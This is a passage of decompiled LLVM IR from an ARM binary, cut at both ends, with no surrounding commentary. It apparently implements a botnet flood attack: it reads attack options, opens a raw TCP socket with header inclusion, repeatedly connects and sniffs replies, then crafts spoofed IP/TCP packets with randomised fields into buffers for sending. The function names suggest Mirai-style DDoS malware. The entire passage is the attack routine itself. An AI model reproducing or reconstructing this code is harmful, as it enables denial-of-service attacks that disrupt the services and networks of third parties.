  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4a8 = load i32, i32* @r4, align 4
  store i32 %v0_b4a8, i32* %r0.global-to-local, align 4
  %v5_b4b0 = inttoptr i32 %v0_b49c to i32*
  %v6_b4b0 = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4b0, i32 16, i32 0)
  %v1_b4b8 = urem i32 %v6_b4b0, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b4c4 = load i32, i32* @r5, align 4
  store i32 %v0_b4c4, i32* %r1.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  store i32 %v0_b4c8, i32* %r0.global-to-local, align 4
  %v5_b4d0 = inttoptr i32 %v0_b4c4 to i32*
  %v6_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v5_b4d0, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4e0 = load i32, i32* @r5, align 4
  store i32 %v0_b4e0, i32* %r1.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r4, align 4
  store i32 %v0_b4e4, i32* %r0.global-to-local, align 4
  %v4_b4e8 = inttoptr i32 %v0_b4e0 to i32*
  %v5_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v4_b4e8, i32 1, i32 1)
  %v1_b4f0 = urem i32 %v5_b4e8, 256
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b504 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b504, i32* %r0.global-to-local, align 4
  %v7_b508 = icmp eq i32 %v3_b504, -1
  store i1 %v7_b508, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b504, i32* @sb, align 4
  br i1 %v7_b508, label %dec_label_pc_b6f8, label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b51c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b51c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b530 = call i32 @__GI_setsockopt(i32 %v3_b504, i32 0, i32 3, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v7_b534 = icmp eq i32 %v5_b530, -1
  store i1 %v7_b534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b534, label %dec_label_pc_b6f0, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b514
  %v0_b53c = load i32, i32* @r7, align 4
  %v3_b53c = mul i32 %v0_b53c, 65536
  store i32 %v3_b53c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b544 = load i32, i32* @r6, align 4
  %v2_b544 = icmp eq i32 %v0_b544, 0
  store i1 %v2_b544, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b54c = urem i32 %v0_b53c, 65536
  store i32 %v3_b54c, i32* @fp, align 4
  br i1 %v2_b544, label %dec_label_pc_b97c, label %dec_label_pc_b554.preheader

dec_label_pc_b554.preheader:                      ; preds = %dec_label_pc_b53c
  %v2_b5a0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5e4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b61c = ptrtoint i32* %stack_var_-80 to i32
  %v2_b628 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b62c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b68c = zext i8 %tmp to i32
  %v1_b690 = and i32 %v4_b68c, 18
  %v2_b694 = icmp eq i32 %v1_b690, 18
  %v4_b838 = sext i8 %v5_b394 to i32
  %sext = mul i32 %v5_b3b0, 16777216
  %v4_b848 = sdiv i32 %sext, 16777216
  %v3_b678 = sext i16 %tmp61 to i32
  %v1_b69c = and i32 %v4_b68c, 5
  %v2_b69c = icmp eq i32 %v1_b69c, 0
  %v4_b5dc = add i32 %v2_b5a0, 82
  %v5_b5dc = inttoptr i32 %v4_b5dc to i16*
  %v1_b7cc = add i32 %v6_b4d0, 40
  %v1_b8e0 = urem i32 %v5_b410, 2
  %tmp97 = sub nsw i32 0, %v1_b8e0
  %v4_b8e8 = and i32 %tmp97, 32
  %v1_b8f8 = urem i32 %v6_b430, 2
  %tmp98 = sub nsw i32 0, %v1_b8f8
  %v4_b900 = and i32 %tmp98, 16
  %v1_b910 = urem i32 %v6_b450, 2
  %tmp99 = sub nsw i32 0, %v1_b910
  %v4_b918 = and i32 %tmp99, 8
  %v1_b928 = urem i32 %v6_b470, 2
  %tmp100 = sub nsw i32 0, %v1_b928
  %v4_b930 = and i32 %tmp100, 4
  %v1_b940 = urem i32 %v6_b490, 2
  %tmp101 = sub nsw i32 0, %v1_b940
  %v3_b948 = and i32 %tmp101, 2
  %v1_b958 = urem i32 %v6_b4b0, 2
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b554.preheader, %dec_label_pc_b6c8
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b6c8 ], [ %tmp34, %dec_label_pc_b554.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b6c8 ], [ %tmp37, %dec_label_pc_b554.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b560 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b560, i32* %r0.global-to-local, align 4
  %v7_b564 = icmp eq i32 %v3_b560, -1
  store i1 %v7_b564, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b560, i32* @r5, align 4
  br i1 %v7_b564, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b6a4
  %v0_b578 = phi i32 [ %v3_b6b8, %dec_label_pc_b6a4 ], [ %v3_b560, %dec_label_pc_b554 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b6a4 ], [ %stack_var_-62.0, %dec_label_pc_b554 ]
  %stack_var_-60.1 = phi i32 [ %v0_b778, %dec_label_pc_b6a4 ], [ %stack_var_-60.0, %dec_label_pc_b554 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b578 = call i32 @__libc_fcntl(i32 %v0_b578, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b580 = or i32 %v2_b578, 2048
  store i32 %v1_b580, i32* @r2, align 4
  %v0_b584 = load i32, i32* @r5, align 4
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  %v2_b588 = call i32 @__libc_fcntl(i32 %v0_b584, i32 4)
  %v3_b58c = load i32, i32* %stack_var_-44, align 4
  %v5_b594 = mul i32 %v3_b58c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b5a8 = add i32 %v5_b594, %arg2
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v1_b5ac = add i32 %v2_b5a8, 20
  %v2_b5ac = inttoptr i32 %v1_b5ac to i8*
  %v3_b5ac = load i8, i8* %v2_b5ac, align 1
  %v4_b5ac = zext i8 %v3_b5ac to i32
  store i32 %v4_b5ac, i32* %r2.global-to-local, align 4
  %v2_b5b0 = icmp ugt i8 %v3_b5ac, 30
  %v7_b5b0 = icmp eq i8 %v3_b5ac, 31
  store i1 %v7_b5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_b5b4 = xor i1 %v7_b5b0, true
  %v3_b5b4 = and i1 %v2_b5b0, %v2_b5b4
  br i1 %v3_b5b4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b570
  %v5_b5b4 = add i32 %v2_b5a8, 16
  %v6_b5b4 = inttoptr i32 %v5_b5b4 to i32*
  %v7_b5b4 = load i32, i32* %v6_b5b4, align 4
  store i32 %v7_b5b4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b570, %bb
  %v4_b5b8 = phi i32 [ %v2_b5a8, %dec_label_pc_b570 ], [ %v7_b5b4, %bb ]
  %v4_b5b8.stack_var_-60.1 = select i1 %v3_b5b4, i32 %v4_b5b8, i32 %stack_var_-60.1
  %v2_b5bc = xor i1 %v2_b5b0, true
  %v3_b5bc = or i1 %v7_b5b0, %v2_b5bc
  br i1 %v3_b5bc, label %dec_label_pc_b704, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %bb71, %dec_label_pc_b704
  %v0_b778 = phi i32 [ %v5_b754, %dec_label_pc_b704 ], [ %v4_b5b8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b5c8 = load i32, i32* @sl, align 4
  %v9_b5c8 = icmp eq i32 %v0_b5c8, 65535
  store i1 %v9_b5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5c8, label %dec_label_pc_b760, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b5c0
  %v4_b5cc = udiv i32 %v0_b5c8, 256
  %v2_b5d0 = urem i32 %v0_b5c8, 256
  store i32 %v2_b5d0, i32* %r2.global-to-local, align 4
  %v5_b5d4 = mul nuw nsw i32 %v2_b5d0, 256
  %v6_b5d4 = or i32 %v5_b5d4, %v4_b5cc
  store i32 %v6_b5d4, i32* %r3.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  %v2_b5dc = trunc i32 %v6_b5d4 to i16
  store i16 %v2_b5dc, i16* %v5_b5dc, align 2
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %.thread9, %dec_label_pc_b760
  %stack_var_-62.2 = phi i16 [ %v1_b760, %dec_label_pc_b760 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5e4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r0.global-to-local, align 4
  %v3_b5f0 = call i32 @__libc_connect(i32 %v0_b5ec, i32 %v2_b5e4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b5f8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5f8, i32* @r4, align 4
  %v9_b658 = icmp eq i32 %tmp35, %v0_b778
  %v4_b680 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b658 to i32
  %v9_b66c = icmp eq i1 %v9_b658, false
  %v9_b684 = icmp eq i32 %v3_b678, %v4_b680
  br label %dec_label_pc_b614

dec_label_pc_b604:                                ; preds = %.thread, %dec_label_pc_b674, %dec_label_pc_b69c, %bb75
  %v2_b604 = call i32 @__GI_time(i32* null)
  %v0_b608 = load i32, i32* @r4, align 4
  %v2_b608 = sub i32 %v2_b604, %v0_b608
  store i32 %v2_b608, i32* %r0.global-to-local, align 4
  %v7_b60c = icmp eq i32 %v2_b608, 10
  store i1 %v7_b60c, i1* %cpsr_z.global-to-local, align 1
  %v8_b610 = icmp sgt i32 %v2_b608, 10
  br i1 %v8_b610, label %dec_label_pc_b6a4, label %dec_label_pc_b614

dec_label_pc_b614:                                ; preds = %dec_label_pc_b604, %dec_label_pc_b5e4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b628, i32* %r1.global-to-local, align 4
  store i32 %v2_b62c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b634 = load i32, i32* @sb, align 4
  store i32 %v0_b634, i32* %r0.global-to-local, align 4
  %v6_b63c = call i32 @__libc_recvfrom(i32 %v0_b634, i32 %v2_b628, i32 256, i32 16384, i32 %v2_b61c, i32 %v2_b62c)
  store i32 %v6_b63c, i32* %r2.global-to-local, align 4
  %v7_b644 = icmp eq i32 %v6_b63c, -1
  store i1 %v7_b644, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b644, label %dec_label_pc_b6f8, label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b614
  store i32 %v0_b778, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b664 = icmp eq i32 %v6_b63c, 40
  store i1 %v7_b664, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b63c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b650
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b604

bb75:                                             ; preds = %dec_label_pc_b650
  store i1 %v9_b66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b66c, label %dec_label_pc_b604, label %dec_label_pc_b674

dec_label_pc_b674:                                ; preds = %bb75
  store i32 %v3_b678, i32* @lr, align 4
  store i32 %v2_b5a0, i32* @r3, align 4
  store i32 %v4_b680, i32* %r2.global-to-local, align 4
  store i1 %v9_b684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b684, label %dec_label_pc_b68c, label %dec_label_pc_b604

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b674
  store i32 %v4_b68c, i32* %r2.global-to-local, align 4
  store i32 %v1_b690, i32* @r3, align 4
  store i1 %v2_b694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b694, label %dec_label_pc_b770, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b68c
  store i1 %v2_b69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b69c, label %dec_label_pc_b604, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b604
  %v0_b6a4 = load i32, i32* @r5, align 4
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__GI___libc_close(i32 %v0_b6a4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b6b8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b6b8, i32* %r0.global-to-local, align 4
  %v3_b6bc = icmp eq i32 %v3_b6b8, -1
  %v8_b6bc = icmp eq i32 %v3_b6b8, -1
  store i1 %v8_b6bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6b8, i32* @r5, align 4
  br i1 %v3_b6bc, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b554, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b554 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b6a4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b554 ], [ %v0_b778, %bb82 ], [ %v0_b778, %dec_label_pc_b6a4 ]
  %v3_b6c8 = load i32, i32* %stack_var_-44, align 4
  %v1_b6cc = add i32 %v3_b6c8, 1
  store i32 %v1_b6cc, i32* @r3, align 4
  %v1_b6d0 = load i32, i32* @r6, align 4
  %v9_b6d0 = icmp eq i32 %v1_b6cc, %v1_b6d0
  store i1 %v9_b6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b6cc, i32* %stack_var_-44, align 4
  %v5_b6d8 = icmp slt i32 %v1_b6cc, %v1_b6d0
  br i1 %v5_b6d8, label %dec_label_pc_b554, label %dec_label_pc_b6dc

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6c8
  store i32 %v6_b4d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b98c

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b514
  %v0_b6f0 = load i32, i32* @sb, align 4
  store i32 %v0_b6f0, i32* %r0.global-to-local, align 4
  %v1_b6f4 = call i32 @__GI___libc_close(i32 %v0_b6f0)
  store i32 %v1_b6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b614, %entry, %dec_label_pc_b6f0
  %v1_b700 = phi i32 [ %v3_b504, %entry ], [ %v1_b6f4, %dec_label_pc_b6f0 ], [ 0, %dec_label_pc_b614 ]
  store i32 %v27_b330, i32* %lr.global-to-local, align 4
  ret i32 %v1_b700

dec_label_pc_b704:                                ; preds = %bb71
  %v1_b704 = add i32 %v4_b5b8, 16
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* @r4, align 4
  %v0_b708 = call i32 @rand_next()
  store i32 %v0_b708, i32* %r0.global-to-local, align 4
  %v3_b70c = load i32, i32* %stack_var_-44, align 4
  %v5_b714 = mul i32 %v3_b70c, 24
  %v0_b71c = load i32, i32* @r4, align 4
  %v1_b71c = and i32 %v0_b71c, 16711680
  store i32 %v1_b71c, i32* %ip.global-to-local, align 4
  %v3_b720 = udiv i32 %v0_b71c, 16777216
  %v2_b724 = add i32 %v5_b714, %arg2
  store i32 %v2_b724, i32* %r1.global-to-local, align 4
  %v4_b728 = udiv i32 %v1_b71c, 256
  %v5_b728 = or i32 %v4_b728, %v3_b720
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b72c = and i32 %v0_b71c, 65280
  store i32 %v1_b72c, i32* %r3.global-to-local, align 4
  %v1_b730 = add i32 %v2_b724, 20
  %v2_b730 = inttoptr i32 %v1_b730 to i8*
  %v3_b730 = load i8, i8* %v2_b730, align 1
  %v4_b730 = zext i8 %v3_b730 to i32
  store i32 %v4_b730, i32* %ip.global-to-local, align 4
  %v5_b738 = call i32 @llvm.bswap.i32(i32 %v0_b71c)
  %v7_b73c = lshr i32 %v0_b708, %v4_b730
  %v8_b73c = add i32 %v7_b73c, %v5_b738
  store i32 %v8_b73c, i32* %r2.global-to-local, align 4
  %v1_b740 = and i32 %v8_b73c, 16711680
  store i32 %v1_b740, i32* %r0.global-to-local, align 4
  %v1_b74c = and i32 %v8_b73c, 65280
  store i32 %v1_b74c, i32* %r1.global-to-local, align 4
  %v5_b754 = call i32 @llvm.bswap.i32(i32 %v8_b73c)
  store i32 %v5_b754, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b5c0

dec_label_pc_b760:                                ; preds = %dec_label_pc_b5c0
  %v0_b760 = call i32 @rand_next()
  %v1_b760 = trunc i32 %v0_b760 to i16
  store i32 %v0_b760, i32* %r0.global-to-local, align 4
  store i32 %v2_b5a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b68c
  %v3_b770 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b770, i32* @r4, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v5_b778 = mul i32 %v3_b770, 16
  %v6_b778 = add i32 %v5_b778, %v2_b34c
  %v7_b778 = inttoptr i32 %v6_b778 to i32*
  store i32 %v0_b778, i32* %v7_b778, align 4
  %v0_b77c = load i32, i32* @r8, align 4
  %v1_b77c = add i32 %v0_b77c, 4
  %v2_b77c = inttoptr i32 %v1_b77c to i32*
  %v3_b77c = load i32, i32* %v2_b77c, align 4
  store i32 %v3_b77c, i32* %r1.global-to-local, align 4
  %v1_b788 = and i32 %v3_b77c, 65280
  store i32 %v1_b788, i32* %r2.global-to-local, align 4
  store i32 %v2_b34c, i32* %r0.global-to-local, align 4
  %v0_b798 = load i32, i32* @r4, align 4
  %v3_b798 = mul i32 %v0_b798, 16
  %v2_b79c = add i32 %v3_b798, %v2_b34c
  store i32 %v2_b79c, i32* %ip.global-to-local, align 4
  %v5_b7a0 = call i32 @llvm.bswap.i32(i32 %v3_b77c)
  store i32 %v5_b7a0, i32* %r3.global-to-local, align 4
  %v2_b7a4 = add i32 %v2_b79c, 4
  %v3_b7a4 = inttoptr i32 %v2_b7a4 to i32*
  store i32 %v5_b7a0, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* @r8, align 4
  %v1_b7a8 = add i32 %v0_b7a8, 8
  %v2_b7a8 = inttoptr i32 %v1_b7a8 to i32*
  %v3_b7a8 = load i32, i32* %v2_b7a8, align 4
  store i32 %v3_b7a8, i32* %r1.global-to-local, align 4
  %v1_b7ac = and i32 %v3_b7a8, 16711680
  store i32 %v1_b7ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r2.global-to-local, align 4
  %v5_b7c4 = call i32 @llvm.bswap.i32(i32 %v3_b7a8)
  store i32 %v5_b7c4, i32* %r3.global-to-local, align 4
  %v1_b7c8 = add i32 %v0_b7a8, 2
  %v2_b7c8 = inttoptr i32 %v1_b7c8 to i16*
  %v3_b7c8 = load i16, i16* %v2_b7c8, align 2
  %v4_b7c8 = zext i16 %v3_b7c8 to i32
  store i32 %v4_b7c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b7cc, i32* @r7, align 4
  %v0_b7d0 = load i32, i32* @lr, align 4
  %v1_b7d0 = trunc i32 %v0_b7d0 to i16
  %v2_b7d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d0 = add i32 %v2_b7d0, 14
  %v4_b7d0 = inttoptr i32 %v3_b7d0 to i16*
  store i16 %v1_b7d0, i16* %v4_b7d0, align 2
  %v0_b7d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i16
  %v2_b7d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 12
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i16*
  store i16 %v1_b7d4, i16* %v4_b7d4, align 2
  %v0_b7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7d8 = add i32 %v1_b7d8, 8
  %v3_b7d8 = inttoptr i32 %v2_b7d8 to i32*
  store i32 %v0_b7d8, i32* %v3_b7d8, align 4
  %v0_b7dc = load i32, i32* @r7, align 4
  store i32 %v0_b7dc, i32* @r0, align 4
  %v0_b7e0 = call i32 @malloc()
  store i32 %v0_b7e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v2_b7ec = load i32, i32* @r4, align 4
  %v5_b7ec = mul i32 %v2_b7ec, 4
  %v6_b7ec = add i32 %v5_b7ec, %v2_b35c
  %v7_b7ec = inttoptr i32 %v6_b7ec to i32*
  store i32 %v0_b7e0, i32* %v7_b7ec, align 4
  %v3_b7f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7f0, i32* %r2.global-to-local, align 4
  %v0_b7f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7f4 = mul i32 %v3_b7f0, 4
  %v5_b7f4 = add i32 %v0_b7f4, %v4_b7f4
  %v6_b7f4 = inttoptr i32 %v5_b7f4 to i32*
  %v7_b7f4 = load i32, i32* %v6_b7f4, align 4
  store i32 %v7_b7f4, i32* @r4, align 4
  %v1_b7f8 = inttoptr i32 %v7_b7f4 to i8*
  %v2_b7f8 = load i8, i8* %v1_b7f8, align 1
  %tmp103 = urem i8 %v2_b7f8, 16
  %v1_b7fc = zext i8 %tmp103 to i32
  %v1_b800 = or i32 %v1_b7fc, 64
  store i32 %v1_b800, i32* %r3.global-to-local, align 4
  %v1_b804 = trunc i32 %v1_b800 to i8
  store i8 %v1_b804, i8* %v1_b7f8, align 1
  %v0_b808 = load i32, i32* @r4, align 4
  %v1_b808 = inttoptr i32 %v0_b808 to i8*
  %v2_b808 = load i8, i8* %v1_b808, align 1
  %v0_b80c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b80c, 256
  %v1_b814 = and i8 %v2_b808, -16
  %v1_b818 = or i8 %v1_b814, 5
  %v1_b81c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b80c, 256
  %v4_b820 = urem i32 %tmp78, 256
  %v5_b820 = or i32 %v4_b820, %v1_b81c
  store i32 %v5_b820, i32* %r2.global-to-local, align 4
  %v0_b824 = load i32, i32* @fp, align 4
  %v1_b824 = urem i32 %v0_b824, 256
  store i32 %v1_b824, i32* %r0.global-to-local, align 4
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  %v3_b82c = udiv i32 %v0_b824, 256
  store i32 %v3_b82c, i32* %r1.global-to-local, align 4
  store i8 %v1_b818, i8* %v1_b808, align 1
  %v0_b834 = load i32, i32* %r1.global-to-local, align 4
  %v1_b834 = load i32, i32* %r0.global-to-local, align 4
  %v4_b834 = mul i32 %v1_b834, 256
  %v5_b834 = or i32 %v4_b834, %v0_b834
  store i32 %v5_b834, i32* %r1.global-to-local, align 4
  store i32 %v4_b838, i32* %r0.global-to-local, align 4
  %v2_b83c = load i32, i32* @r4, align 4
  %v3_b83c = add i32 %v2_b83c, 1
  %v4_b83c = inttoptr i32 %v3_b83c to i8*
  store i8 %v5_b394, i8* %v4_b83c, align 1
  %v0_b840 = load i32, i32* %r1.global-to-local, align 4
  %v1_b840 = trunc i32 %v0_b840 to i16
  %v2_b840 = load i32, i32* @r4, align 4
  %v3_b840 = add i32 %v2_b840, 4
  %v4_b840 = inttoptr i32 %v3_b840 to i16*
  store i16 %v1_b840, i16* %v4_b840, align 2
  %v0_b844 = load i32, i32* %ip.global-to-local, align 4
  %v2_b844 = icmp eq i32 %v0_b844, 0
  store i1 %v2_b844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b848, i32* %r1.global-to-local, align 4
  %v0_b84c = load i32, i32* %r2.global-to-local, align 4
  %v1_b84c = trunc i32 %v0_b84c to i16
  %v2_b84c = load i32, i32* @r4, align 4
  %v3_b84c = add i32 %v2_b84c, 2
  %v4_b84c = inttoptr i32 %v3_b84c to i16*
  store i16 %v1_b84c, i16* %v4_b84c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b844, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b770
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b770, %bb79
  %v0_b858 = load i32, i32* %r1.global-to-local, align 4
  %v1_b858 = trunc i32 %v0_b858 to i8
  %v2_b858 = load i32, i32* @r4, align 4
  %v3_b858 = add i32 %v2_b858, 8
  %v4_b858 = inttoptr i32 %v3_b858 to i8*
  store i8 %v1_b858, i8* %v4_b858, align 1
  %v0_b85c = load i32, i32* %r3.global-to-local, align 4
  %v1_b85c = trunc i32 %v0_b85c to i8
  %v2_b85c = load i32, i32* @r4, align 4
  %v3_b85c = add i32 %v2_b85c, 9
  %v4_b85c = inttoptr i32 %v3_b85c to i8*
  store i8 %v1_b85c, i8* %v4_b85c, align 1
  %v0_b860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b860, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b860 = load i32, i32* %r2.global-to-local, align 4
  %v2_b860 = trunc i32 %v1_b860 to i16
  %v3_b860 = load i32, i32* @r4, align 4
  %v4_b860 = add i32 %v3_b860, 6
  %v5_b860 = inttoptr i32 %v4_b860 to i16*
  store i16 %v2_b860, i16* %v5_b860, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b868 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_b868, i32* %r1.global-to-local, align 4
  %v1_b86c = load i32, i32* @r4, align 4
  %v2_b86c = add i32 %v1_b86c, 12
  %v3_b86c = inttoptr i32 %v2_b86c to i32*
  store i32 %v2_b868, i32* %v3_b86c, align 4
  %v3_b870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b870, i32* %r3.global-to-local, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v4_b878 = mul i32 %v3_b870, 16
  %v5_b878 = add i32 %v4_b878, %v2_b34c
  %v6_b878 = inttoptr i32 %v5_b878 to i32*
  %v7_b878 = load i32, i32* %v6_b878, align 4
  store i32 %v7_b878, i32* %r2.global-to-local, align 4
  store i32 %v5_b878, i32* %r3.global-to-local, align 4
  %v1_b884 = load i32, i32* @r4, align 4
  %v2_b884 = add i32 %v1_b884, 16
  %v3_b884 = inttoptr i32 %v2_b884 to i32*
  store i32 %v7_b878, i32* %v3_b884, align 4
  %v0_b888 = load i32, i32* %r3.global-to-local, align 4
  %v1_b888 = add i32 %v0_b888, 12
  %v2_b888 = inttoptr i32 %v1_b888 to i16*
  %v3_b888 = load i16, i16* %v2_b888, align 2
  %v4_b888 = zext i16 %v3_b888 to i32
  store i32 %v4_b888, i32* %r0.global-to-local, align 4
  %v1_b88c = add i32 %v0_b888, 8
  %v2_b88c = inttoptr i32 %v1_b88c to i32*
